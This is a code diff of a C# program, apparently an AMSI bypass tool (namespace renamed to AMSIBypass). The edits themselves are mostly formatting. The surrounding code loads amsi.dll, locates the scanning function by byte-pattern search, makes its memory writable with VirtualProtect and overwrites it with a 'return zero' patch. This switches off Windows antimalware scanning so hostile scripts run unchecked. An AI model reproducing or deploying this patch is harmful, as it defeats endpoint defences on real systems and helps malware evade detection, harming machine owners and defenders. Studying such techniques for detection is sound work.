@@ -1,7 +1,7 @@
-using System;
+﻿using System;
 using System.Runtime.InteropServices;
 
-namespace AMSI {
+namespace AMSIBypass {
     public class Program {
 
         [DllImport("kernel32")]
@@ -20,14 +20,14 @@ namespace AMSI {
             // Get the DllCanUnload function address
             IntPtr hModule = LoadLibrary("amsi.dll");
             Console.WriteLine("[+] AMSI DLL handle: " + hModule);
-            
+
             IntPtr dllCanUnloadNowAddress = GetProcAddress(hModule, "DllCanUnloadNow");
             Console.WriteLine("[+] DllCanUnloadNow address: " + dllCanUnloadNowAddress);
 
             // Dynamically get the address of the function to patch
             byte[] egg = { };
             if (IntPtr.Size == 8) {
-                egg = new byte[] { 
+                egg = new byte[] {
                     0x4C, 0x8B, 0xDC,       // mov     r11,rsp
                     0x49, 0x89, 0x5B, 0x08, // mov     qword ptr [r11+8],rbx
                     0x49, 0x89, 0x6B, 0x10, // mov     qword ptr [r11+10h],rbp
@@ -56,7 +56,7 @@ namespace AMSI {
             VirtualProtect(address, (UIntPtr)2, 4, out oldProtectionBuffer);
 
             // Patch the function
-            byte[] patch = { 0x31, 0xC0, 0xC3};
+            byte[] patch = { 0x31, 0xC0, 0xC3 };
             Marshal.Copy(patch, 0, address, 3);
 
             // Reinitialise the memory protection of the memory region
